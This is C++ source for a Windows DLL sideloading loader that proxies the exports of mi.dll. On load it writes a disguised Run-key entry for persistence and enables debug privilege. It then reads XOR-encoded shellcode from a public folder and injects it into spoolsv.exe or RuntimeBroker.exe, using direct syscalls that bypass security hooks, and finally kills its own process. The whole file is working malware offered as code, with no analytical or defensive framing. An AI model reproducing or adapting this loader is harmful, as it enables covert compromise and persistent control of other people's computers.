// DLL Proxy
#include <Shellapi.h>
#include "pch.h"
#include <tchar.h>
#include <stdio.h>
#include <thread>
#include "direct.h"
#include <Shlobj.h>
#include <Shlwapi.h>
#include <psapi.h>
#include <comdef.h>
#include <tlhelp32.h>
#include "syscall.h"

#pragma comment(linker, "/export:MI_Application_InitializeV1=C:\\Windows\\System32\\mi.MI_Application_InitializeV1")
#pragma comment(linker, "/export:mi_clientFT_V1=C:\\Windows\\System32\\mi.mi_clientFT_V1")


void Hook_Init();
std::thread hookthread;
char shellcode[307296];

void EnableDebugPriv()
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);
	CloseHandle(hToken);
}

int findMyProc(const char* procname) {
	DWORD	adwProcesses[1024 * 2];
	DWORD	dwReturnLen1 = NULL;
	DWORD	dwReturnLen2 = NULL;
	DWORD	dwNmbrOfPids = NULL;
	HANDLE		hProcess = NULL;
	HMODULE		hModule = NULL;
	CHAR		szProc[MAX_PATH];

	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		return 0;
	}
	// Calculating the number of elements in the array 
	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);
	for (int i = 0; i < dwNmbrOfPids; i++) {

		// If process is not NULL
		if (adwProcesses[i] != NULL) {

			// Open a process handle 
			if ((hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, adwProcesses[i])) != NULL) {

				// If handle is valid
				// Get a handle of a module in the process 'hProcess'.
				// The module handle is needed for 'GetModuleBaseName'
				if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					return 0;
				}
				else {
					// If EnumProcessModules succeeded
					// Get the name of 'hProcess' and save it in the 'szProc' variable 
					if (!GetModuleBaseNameA(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						return 0;
					}
					else {
						// Perform the comparison logic
						if (strcmp(procname, szProc) == 0) {
							// char pid[10];
							// _itoa_s(adwProcesses[i], pid, 10);
							// MessageBox(0, pid, "DEBUG", 0);
							return (adwProcesses[i]);

						}
					}
				}

				CloseHandle(hProcess);
			}
		}
	}
	return 0;
}


void readShellcode() {
	char shellcodeDir[255] = "C:\\Users\\Public\\shell.dat";
	FILE* file;
	fopen_s(&file, shellcodeDir, "rb");
	fread(shellcode, sizeof(shellcode), 1, file);
	fclose(file);
}

void run(HANDLE processHandle) {
	HANDLE remoteThread;
	SIZE_T len = sizeof(shellcode);
	PVOID remoteBuffer;
	// remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	Sw3NtAllocateVirtualMemory(processHandle, &remoteBuffer, 0, &len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	// WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	Sw3NtWriteVirtualMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL);
	// srand(clock());
	// int num = ((rand() % (100 - 1 + 1)) + 1) * 200;
	// Sleep(num);
	// CreateRemoteThread(processHandle, nullptr, NULL, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	Sw3NtCreateThreadEx(&remoteThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuffer, NULL, FALSE, 0, 0, 0, NULL);
	CloseHandle(processHandle);
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH: {
		{
			switch (fdwReason)
			{
			case DLL_PROCESS_ATTACH: {
				HKEY hkey = NULL;
				LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", 0, KEY_WRITE, &hkey);
				if (res == ERROR_SUCCESS) {
					char value[255] = { 0 };
					DWORD BufferSize = 255;
					RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", "4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
					Sleep(100);
					if (value[0] != 0) {
						remove(value);
						RegSetValueEx(hkey, (LPCSTR)"4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", 0, REG_SZ, NULL, NULL);
					}
					else {
					}
					RegCloseKey(hkey);
				}
				HKEY hkey2 = NULL;
				TCHAR szFileName[MAX_PATH];
				GetModuleFileName(NULL, szFileName, MAX_PATH);
				// startup
				LONG res2 = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey2);
				if (res2 == ERROR_SUCCESS) {
					char value[255] = { 0 };
					DWORD BufferSize = 255;
					RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "HostProcessForWinRMplug-ins", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
					if (value[0] != 0) {
					}
					else {
						RegSetValueEx(hkey2, (LPCSTR)"HostProcessForWinRMplug-ins", 0, REG_SZ, (unsigned char*)szFileName, strlen(szFileName));
					}
					RegCloseKey(hkey2);
				}
				HANDLE processHandle = NULL;
				BOOL bSuccess = FALSE;
				LPTSTR pszCmd = NULL;
				PROCESS_INFORMATION pi = { 0 };
				STARTUPINFO si = { 0 };
				si.cb = sizeof(si);
				EnableDebugPriv();
				int spid = findMyProc("spoolsv.exe");
				int upid = findMyProc("RuntimeBroker.exe");
				if (spid != 0 || upid != 0) {
					CLIENT_ID clientId = { (HANDLE)spid, NULL };
					OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes) };
					Sw3NtOpenProcess(&processHandle, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
					if (processHandle == NULL) {
						CLIENT_ID clientId = { (HANDLE)upid, NULL };
						Sw3NtOpenProcess(&processHandle, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
					}
					// ResumeThread(processHandle);
					//char pid[10];
					//_itoa_s(upid, pid, 10);
					//MessageBox(0, pid, "DEBUG", 0);
					//else {
						//exit(1);
					//}
					readShellcode();
					// XOR shellcode
					char key[] = "xV6NoPbqVs";
					int keysize = sizeof(key);
					int i;
					for (i = 0; i < sizeof(shellcode); i++) {
						shellcode[i] = key[i % keysize] ^ shellcode[i];
					}
					// Inject
					run(processHandle);
				}
				// Self kill
				int pid = GetCurrentProcessId();
				char cid[10];
				_itoa_s(pid, cid, 10);
				STARTUPINFO siStartupInfo;
				PROCESS_INFORMATION piProcessInfo;
				memset(&siStartupInfo, 0, sizeof(siStartupInfo));
				memset(&piProcessInfo, 0, sizeof(piProcessInfo));
				siStartupInfo.cb = sizeof(siStartupInfo);
				char command[] = "cmd /c taskkill /F /PID";
				strcat_s(command, cid);
				int done = CreateProcess(NULL, (LPTSTR)command, NULL, NULL, TRUE, CREATE_NEW_PROCESS_GROUP, NULL, NULL, &siStartupInfo, &piProcessInfo);
			}
			case DLL_PROCESS_DETACH:
				hookthread.detach();
				// Code to run when the DLL is freed
				break;

			case DLL_THREAD_ATTACH:
				// Code to run when a thread is created during the DLL's lifetime
				break;
			case DLL_THREAD_DETACH:
				// Code to run when a thread ends normally.
				break;
			}
			return TRUE;
		}
	}
	}
}
